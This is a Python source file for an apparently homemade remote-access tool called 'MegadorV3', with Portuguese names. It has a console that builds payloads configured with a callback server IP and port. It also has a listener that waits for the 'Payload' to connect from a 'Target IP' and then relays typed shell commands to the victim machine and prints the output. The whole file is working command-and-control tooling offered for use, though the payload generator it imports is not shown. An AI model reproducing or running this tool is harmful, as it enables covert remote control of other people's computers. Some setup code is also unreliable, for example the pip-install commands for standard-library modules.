import sys
import os
import platform
import time
import socket
from colorama import Style,Fore
from  construtor.gerador import __CONSTRUTOR_DE_PAYLOAD__
import keyboard


def texto(texto, cor):
    return f'{Style.BRIGHT}{cor}{texto}{Fore.RESET}'
def TEG():
    return f'{Style.BRIGHT}{Fore.RED}|{Fore.RESET}'
def TABELA(dicionario):
    print("")
    for chave in dicionario:
        print(f"{texto("|",Fore.RED)} {texto(chave, Fore.BLUE)}{texto("=", Fore.RED)}{dicionario[chave]}")

class Megador:
    def __init__(self):
        self.iniciar_loop = True
        self.TIPO_DO_SISTEMA_OPERACIONAL = platform.system()
        self.LISTA_DE_BIBLIOTECAS_PARA_O_FUNCIONAMENTO_DO_SISTEMA = {
            'Linux':{
                'os':'pip3 install os', 
                'colorama':'pip3 install colorama',
                'time':'pip3 install time',
                'platform':'pip3 install platform'
                },
            'Windows':{
                'os':'pip install os', 
                'colorama':'pip install colorama',
                'time':'pip install time',
                'platform':'pip install platform'
                }
            }
        self.Lista_De_comandos = {
            'Linux':{
                'clear':lambda: os.system("clear")
                },
            'Windows':{
                'clear':lambda: os.system("cls")
                }
            }
        self.lista_de_argumentos = {
            '--project-name':'',
            '--payload-name':'',
            '--server-ip':'',
            '--server-port':''
        }
    def TABELA(self, dicionario):
        print("")
        for chave in dicionario:
            print(f"{texto("|",Fore.RED)} {texto(chave, Fore.BLUE)}{texto("=", Fore.RED)}{dicionario[chave]}")
        
    def limpar_terminal(self):
        comando = self.Lista_De_comandos[self.TIPO_DO_SISTEMA_OPERACIONAL]
        comando['clear']()

    def CARREGAR_LOGO_MEGADOR(self):
        self.limpar_terminal()
        import logo
        print(texto(logo.logo1, Fore.CYAN))


    
    def P00_VERIFICAR_AS_BIBLIOTECAS_NECESSARIAS_PARA_O_FUNCIONAMENTO_DO_SISTEMA(self):
        for biblioteca in self.LISTA_DE_BIBLIOTECAS_PARA_O_FUNCIONAMENTO_DO_SISTEMA[self.TIPO_DO_SISTEMA_OPERACIONAL].keys():
            try:
                __import__(biblioteca)
            except ImportError:
                coletar_pip = self.LISTA_DE_BIBLIOTECAS_PARA_O_FUNCIONAMENTO_DO_SISTEMA[self.TIPO_DO_SISTEMA_OPERACIONAL]
                comando_pip = coletar_pip[biblioteca]
                if biblioteca:
                    resposta_usuario = input(f"Biblioteca {biblioteca} pendente, deseja instalar agora ? (S ou N): ")
                    match resposta_usuario.lower():
                        case 's':
                            os.system(f'{comando_pip}')
                        case 'n':
                            self.iniciar_loop = False
                        case '':
                            self.iniciar_loop = False
                
                else:
                    pass

    def TODOS_OS_COMANDOS_DISPONIVEIS(self, parametro):
        if 'build' in parametro:
            construtor = Build()
            # Remove 'build' e limpa os espaços extras
            argumento = parametro.replace('build', '').strip()
            if argumento != '':

                if '--project-name=' in argumento:
                    valor_project_name = argumento.split('--project-name=')[1].split()[0]  # Pega o valor após '--project-name='
                    self.lista_de_argumentos['--project-name'] = valor_project_name
                    print("valor adicionado!")

                if '--payload-name=' in argumento:
                    valor_payload_name = argumento.split('--payload-name=')[1].split()[0]  # Pega o valor após '--type='
                    self.lista_de_argumentos['--payload-name'] = valor_payload_name
                    print("valor adicionado!")
                
                if '--server-ip=' in argumento:
                    valor_server_ip = argumento.split('--server-ip=')[1].split()[0]
                    self.lista_de_argumentos['--server-ip'] = valor_server_ip
                    print("valor adicionado!")

                if '--server-port=' in argumento:
                    valor_server_port = argumento.split('--server-port=')[1].split()[0]
                    self.lista_de_argumentos['--server-port'] = valor_server_port
                    print("valor adicionado!")
                
                if '--shows' in argumento:
                    self.TABELA(self.lista_de_argumentos)
                
                if 'start' in argumento:
                    argumentos_todos = all(self.lista_de_argumentos.values())
                    if not argumentos_todos:
                        print(f"{texto("|",Fore.RED)} Error still missing {len(self.lista_de_argumentos.values())} to start building the payload.")
                        self.TABELA(self.lista_de_argumentos)
                    else:
                        construtor.INICIAR_CONSTRUCAO(dicionario=self.lista_de_argumentos)
            

            else:
                print(f"\n{texto("--payload", Fore.BLUE)}: iniciar o modo criador de payload\n{texto("--type", Fore.BLUE)}: especificar o tipo de payload.")
            
        if 'clean' in parametro:
            self.limpar_terminal()
            self.CARREGAR_LOGO_MEGADOR()

        if 'start server' in parametro:
            inicar = Console()
            inicar.HOST = input(texto("|Server IP: ",cor=Fore.RED))
            inicar.PORT = int(input(texto("|Server PORT: ",cor=Fore.RED)))
            inicar.INICIAR_CONSOLE()


    def P01_SISTEMA_DE_REPETICAO_DO_MEGADOR(self):
        self.CARREGAR_LOGO_MEGADOR()
        while self.iniciar_loop == True:
            comando = input(texto('\n|MegadorV3> ', cor=Fore.RED))
            self.TODOS_OS_COMANDOS_DISPONIVEIS(comando)

    
    def INICIAR_MEGADOR(self):
        self.P00_VERIFICAR_AS_BIBLIOTECAS_NECESSARIAS_PARA_O_FUNCIONAMENTO_DO_SISTEMA()
        self.P01_SISTEMA_DE_REPETICAO_DO_MEGADOR()

class Console:
    def __init__(self):
        self.HOST = '0.0.0.0'
        self.PORT = 789

    def servidor_shell(self):
        """Servidor que aceita conexões e executa comandos remotamente."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.bind((self.HOST, self.PORT))
            server.listen(1)
            print(f"\n{texto('|---', Fore.RED)}{texto("Waiting for connection with Payload", Fore.YELLOW)}{texto('---|', Fore.RED)}")

            conn, addr = server.accept()
            print(f"\n{texto('|---', Fore.RED)}{texto("Payload successfully connected to Target IP", Fore.GREEN)}{texto('---|', Fore.RED)}")
            print(texto("|----> ", Fore.RED) + texto(addr, Fore.CYAN) + texto('---|', Fore.RED))

            while True:
                comando = input(texto("\n|Mega-Shell> ", Fore.BLUE))
                if comando.lower() == "exit":
                    conn.sendall(b"exit")
                    break
                if comando.lower() == 'clean':
                    os.system("cls")

                conn.sendall(comando.encode())
                resposta = conn.recv(4096).decode()
                print(f"\n{resposta}")
    
    def INICIAR_CONSOLE(self):
        self.servidor_shell()

class Build:
    def __init__(self):
        self.payload = False
        self.nome_da_pasta = 'PROJETO_MEGADOR'
        self.nome_payload = 'megaload'
        self.ip_do_servidor = '192.168.1.10'
        self.porta_do_servidor = 789

    def Construtor(self, dicionario):
        from construtor.gerador import __CONSTRUTOR_DE_PAYLOAD__ 

        construir = __CONSTRUTOR_DE_PAYLOAD__()
        construir.NOME_PASTA = dicionario['--project-name']
        construir.NOME_PAYLOAD = dicionario['--payload-name']
        construir.IP_DO_SERVIDOR = dicionario['--server-ip']
        construir.PORTA_DO_SERVIDOR = int(dicionario['--server-port'])
        construir.INICIAR_CONSTRUCAO()
    
    def INICIAR_CONSTRUCAO(self, dicionario):

        self.Construtor(dicionario=dicionario)



if __name__=="__main__":
    mdr = Megador()
    mdr.INICIAR_MEGADOR()